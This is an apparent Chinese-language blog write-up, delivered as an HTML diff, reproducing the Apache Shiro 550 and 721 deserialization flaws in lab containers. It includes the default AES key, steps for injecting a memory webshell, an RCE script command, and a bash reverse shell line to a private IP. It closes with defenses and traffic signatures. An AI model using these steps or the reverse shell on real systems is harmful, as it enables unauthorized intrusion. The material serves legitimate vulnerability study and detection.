@@ -1,0 +1,231 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【漏洞复现】Shiro 反序列化漏洞复现 | Lusen的小窝</title><meta name="author" content="Lusen"><meta name="copyright" content="Lusen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="【漏洞复现】Shiro 反序列化漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【漏洞复现】Shiro 反序列化漏洞复现">
+<meta property="og:url" content="http://example.com/2024/02/27/VulnRep-Shiro/index.html">
+<meta property="og:site_name" content="Lusen的小窝">
+<meta property="og:description" content="【漏洞复现】Shiro 反序列化漏洞复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/24.jpg">
+<meta property="article:published_time" content="2024-02-27T06:52:19.000Z">
+<meta property="article:modified_time" content="2024-06-11T13:43:59.605Z">
+<meta property="article:author" content="Lusen">
+<meta property="article:tag" content="Shiro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/24.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/02/27/VulnRep-Shiro/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【漏洞复现】Shiro 反序列化漏洞复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-11 21:43:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/friend_404.gif" data-original="/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">36</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E7%BA%A2%E9%98%9F%E5%85%A5%E4%BE%B5/"><i class="fa-fw fas fa-folder-open"></i><span> 红队入侵</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5/"><i class="fa-fw fas fa-folder-open"></i><span> 蓝队应急</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%A1%E8%AE%A1/"><i class="fa-fw fas fa-folder-open"></i><span> 复现与审计</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 内网渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Python%E6%AD%A6%E5%99%A8%E5%BA%93/"><i class="fa-fw fas fa-folder-open"></i><span> Python武器库</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%85%8D%E6%9D%80%E4%B8%93%E6%A0%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 免杀专栏</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Vulnhub%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Vulnhub系列靶场</span></a></li><li><a class="site-page child" href="/categories/OSCP%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> OSCP系列靶场</span></a></li><li><a class="site-page child" href="/categories/%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> 应急靶场</span></a></li><li><a class="site-page child" href="/categories/CTF%E7%AB%9E%E8%B5%9B/"><i class="fa-fw fas fa-folder-open"></i><span> CTF竞赛</span></a></li><li><a class="site-page child" href="/categories/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/"><i class="fa-fw fas fa-folder-open"></i><span> 漏洞扫描器</span></a></li><li><a class="site-page child" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-fw fas fa-folder-open"></i><span> 基础知识</span></a></li><li><a class="site-page child" href="/categories/%E5%85%B6%E4%BB%96%E7%BB%8F%E9%AA%8C/"><i class="fa-fw fas fa-folder-open"></i><span> 其他经验</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/24.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Lusen的小窝"><span class="site-name">Lusen的小窝</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E7%BA%A2%E9%98%9F%E5%85%A5%E4%BE%B5/"><i class="fa-fw fas fa-folder-open"></i><span> 红队入侵</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5/"><i class="fa-fw fas fa-folder-open"></i><span> 蓝队应急</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%A1%E8%AE%A1/"><i class="fa-fw fas fa-folder-open"></i><span> 复现与审计</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 内网渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Python%E6%AD%A6%E5%99%A8%E5%BA%93/"><i class="fa-fw fas fa-folder-open"></i><span> Python武器库</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%85%8D%E6%9D%80%E4%B8%93%E6%A0%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 免杀专栏</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Vulnhub%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Vulnhub系列靶场</span></a></li><li><a class="site-page child" href="/categories/OSCP%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> OSCP系列靶场</span></a></li><li><a class="site-page child" href="/categories/%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> 应急靶场</span></a></li><li><a class="site-page child" href="/categories/CTF%E7%AB%9E%E8%B5%9B/"><i class="fa-fw fas fa-folder-open"></i><span> CTF竞赛</span></a></li><li><a class="site-page child" href="/categories/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/"><i class="fa-fw fas fa-folder-open"></i><span> 漏洞扫描器</span></a></li><li><a class="site-page child" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-fw fas fa-folder-open"></i><span> 基础知识</span></a></li><li><a class="site-page child" href="/categories/%E5%85%B6%E4%BB%96%E7%BB%8F%E9%AA%8C/"><i class="fa-fw fas fa-folder-open"></i><span> 其他经验</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【漏洞复现】Shiro 反序列化漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-27T06:52:19.000Z" title="发表于 2024-02-27 14:52:19">2024-02-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-11T13:43:59.605Z" title="更新于 2024-06-11 21:43:59">2024-06-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%A1%E8%AE%A1/">复现与审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">890</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【漏洞复现】Shiro 反序列化漏洞复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="【漏洞复现】Shiro-反序列化漏洞复现"><a href="#【漏洞复现】Shiro-反序列化漏洞复现" class="headerlink" title="【漏洞复现】Shiro 反序列化漏洞复现"></a>【漏洞复现】Shiro 反序列化漏洞复现</h1><h2 id="一、Shiro-介绍"><a href="#一、Shiro-介绍" class="headerlink" title="一、Shiro 介绍"></a>一、Shiro 介绍</h2><h3 id="1、Shiro-简介"><a href="#1、Shiro-简介" class="headerlink" title="1、Shiro 简介"></a>1、Shiro 简介</h3><p>Shiro 是Apache 的一个强大且易用的Java安全框架，用来进行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，就会导致shiro的反序列化漏洞。</p>
+<h3 id="2、如何判断Shiro-框架（Shiro指纹）"><a href="#2、如何判断Shiro-框架（Shiro指纹）" class="headerlink" title="2、如何判断Shiro 框架（Shiro指纹）"></a>2、如何判断Shiro 框架（Shiro指纹）</h3><p>勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响应包中是否有Set-cookie:rememberMe&#x3D;deleteMe字段。</p>
+<h2 id="二、Shiro-550反序列化漏洞（CVE-2016-4437）"><a href="#二、Shiro-550反序列化漏洞（CVE-2016-4437）" class="headerlink" title="二、Shiro 550反序列化漏洞（CVE-2016-4437）"></a>二、Shiro 550反序列化漏洞（CVE-2016-4437）</h2><h3 id="1、漏洞成因"><a href="#1、漏洞成因" class="headerlink" title="1、漏洞成因"></a>1、漏洞成因</h3><p>影响版本：<strong>Apache Shiro &lt;&#x3D;1.2.24</strong></p>
+<p>在受影响的 Apache Shiro 版本中使用了固定的AES密钥 <code>kPH+bIxk5D2deZiIxcaaaA==</code>。</p>
+<p>cookie的流程是：得到 rememberMe 的cookie 值–&gt;进行Base64 解密–&gt;再进行AES解密–&gt;最后进行反序列化执行代码。</p>
+<h3 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h3><p>使用vulhub 搭建靶场</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240227134907495.png" alt="image-20240227134907495"></p>
+<h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>用BP抓包，确认是Shiro 框架</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240227135459292.png" alt="image-20240227135459292"></p>
+<p>我们使用现成的工具进行检测，指定固定的密钥</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240227140040809.png" alt="image-20240227140040809"></p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240227140136993.png" alt="image-20240227140136993"></p>
+<h3 id="4、内存马注入"><a href="#4、内存马注入" class="headerlink" title="4、内存马注入"></a>4、内存马注入</h3><p>先准备好Shiro 类型的内存马：是经过了序列化和AES加密以及Base64加密</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240423171813971.png" alt="image-20240423171813971"></p>
+<p>抓包注入</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240423172324721.png" alt="image-20240423172324721"></p>
+<p>蚁剑连接</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240423174226067.png" alt="image-20240423174226067"></p>
+<h2 id="三、Shiro-721反序列化漏洞（CVE-2019-12422）"><a href="#三、Shiro-721反序列化漏洞（CVE-2019-12422）" class="headerlink" title="三、Shiro 721反序列化漏洞（CVE-2019-12422）"></a>三、Shiro 721反序列化漏洞（CVE-2019-12422）</h2><h3 id="1、漏洞成因-1"><a href="#1、漏洞成因-1" class="headerlink" title="1、漏洞成因"></a>1、漏洞成因</h3><p>影响版本：<strong>1.2.4 &lt; Apache Shiro &lt; 1.4.2</strong></p>
+<p>相较于shiro 550，在shiro 721中使用的加密方式是AES-CBC，其中的aes加密的key 变成由系统随机生成，但是其他解析过程依然一样，也就意味着，如果我们能够得到aes 解密使用的key 的话，依然能够进行反序列化RCE</p>
+<h3 id="2、环境搭建-1"><a href="#2、环境搭建-1" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inspiringz/Shiro-721.git</span><br><span class="line">cd Shiro-721/Docker</span><br><span class="line">docker build -t shiro-721 .</span><br><span class="line">docker run -p 8080:8080 -d shiro-721</span><br></pre></td></tr></table></figure>
+
+<p>如果未能启动成功，可以再执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --privileged -p 8080:8080 -it shiro-721</span><br></pre></td></tr></table></figure>
+
+<p>将会把容器的执行情况输出到前台，之后访问即可</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240314141349035.png" alt="image-20240314141349035"></p>
+<h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>访问靶机的8080端口，进入登录页面</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240314160244583.png" alt="image-20240314160244583"></p>
+<p>上方提示了用户名和密码，我们用其中一个进行登录，并勾选<code>Remember Me</code>，抓包</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240314161130004.png" alt="image-20240314161130004"></p>
+<p>确认是Shiro 框架，我们依然使用工具，我们不知道aes加密的密钥kay，需要在登录成功之后尝试爆破</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240314161503333.png" alt="image-20240314161503333"></p>
+<p>之后填入密钥，检测利用链，尝试命令执行，成功获取shell</p>
+<p><img src="/img/friend_404.gif" data-original="/img/VulnRep-Log4j/img/VulnRep-Shiro/image-20240314161603880.png" alt="image-20240314161603880"></p>
+<h2 id="四、上线不出网Shiro反序列化"><a href="#四、上线不出网Shiro反序列化" class="headerlink" title="四、上线不出网Shiro反序列化"></a>四、上线不出网Shiro反序列化</h2><p>Shiro反序列化检测脚本：<a target="_blank" rel="noopener" href="https://github.com/zhzyker/shiro-1.2.4-rce">https://github.com/zhzyker/shiro-1.2.4-rce</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro-1.2.4_rce.py http://1.1.1.1:8080</span><br></pre></td></tr></table></figure>
+
+<p>之后执行反弹shell，用nc监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.109.9/8889 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h2><ul>
+<li>及时升级shiro版本，不再使用固定的密钥加密。</li>
+<li>在应用程序上部署防火墙、加强身份验证等措施以提高安全性</li>
+<li>如果程序不需要RememberMe功能，则完全可以禁用它</li>
+</ul>
+<h2 id="六、shrio550和721的区别"><a href="#六、shrio550和721的区别" class="headerlink" title="六、shrio550和721的区别"></a>六、shrio550和721的区别</h2><ol>
+<li>主要区别在于Shiro550的ase加密的key使用已知默认密码，只要有足够的密码，不需要Remember Cookie的</li>
+<li>Shiro721的ase加密的key为系统随机生成，需要利用登录后的rememberMe去爆破正确的key值。利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，再去构造反序列化攻击。</li>
+</ol>
+<h2 id="七、Shiro-攻击流量特征"><a href="#七、Shiro-攻击流量特征" class="headerlink" title="七、Shiro 攻击流量特征"></a>七、Shiro 攻击流量特征</h2><p>总结：</p>
+<ol>
+<li>请求包Cookie的rememberMe中会存在AES+base64加密的一串java反序列化代码。</li>
+<li>响应头存在<code>Set-Cookie：rememberMe=deleteMe</code></li>
+<li>响应包中存在base64加密数据，该数据可作为攻击成功的判定条件。</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Lusen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/02/27/VulnRep-Shiro/">http://example.com/2024/02/27/VulnRep-Shiro/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Lusen的小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Shiro/">Shiro</a></div><div class="post_share"><div class="social-share" data-image="/img/24.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/27/VulnRep-Log4j/" title="【漏洞复现】Apache Log4j系列漏洞复现"><img class="cover" src="/img/friend_404.gif" data-original="/img/25.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【漏洞复现】Apache Log4j系列漏洞复现</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/26/VulnRep-Fastjson/" title="【漏洞复现】Fastjson 系列反序列化漏洞复现"><img class="cover" src="/img/friend_404.gif" data-original="/img/23.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【漏洞复现】Fastjson 系列反序列化漏洞复现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/friend_404.gif" data-original="/img/logo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Lusen</div><div class="author-info__description">学无止境</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">36</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Lusensec" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://wpa.qq.com/msgrd?v=3&amp;uin=811209815&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:811209815@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章和相关工具仅供学习参考，禁止用于其他！！！未经授权禁止利用文章中的技术或工具对任何计算机或其他终端系统进行入侵操作，否则造成的直接或间接的后果和损失，均由使用者本人承担，本人不为此承担任何责任。如需转载或传播文章，需保证文章的完整性！文章如有侵权行为，请联系告知，我们会立即删除或修改并致歉！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">【漏洞复现】Shiro 反序列化漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Shiro-%E4%BB%8B%E7%BB%8D"><span class="toc-text">一、Shiro 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81Shiro-%E7%AE%80%E4%BB%8B"><span class="toc-text">1、Shiro 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADShiro-%E6%A1%86%E6%9E%B6%EF%BC%88Shiro%E6%8C%87%E7%BA%B9%EF%BC%89"><span class="toc-text">2、如何判断Shiro 框架（Shiro指纹）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89"><span class="toc-text">二、Shiro 550反序列化漏洞（CVE-2016-4437）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">1、漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">2、环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">3、漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">4、内存马注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-12422%EF%BC%89"><span class="toc-text">三、Shiro 721反序列化漏洞（CVE-2019-12422）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-1"><span class="toc-text">1、漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-text">2、环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">3、漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 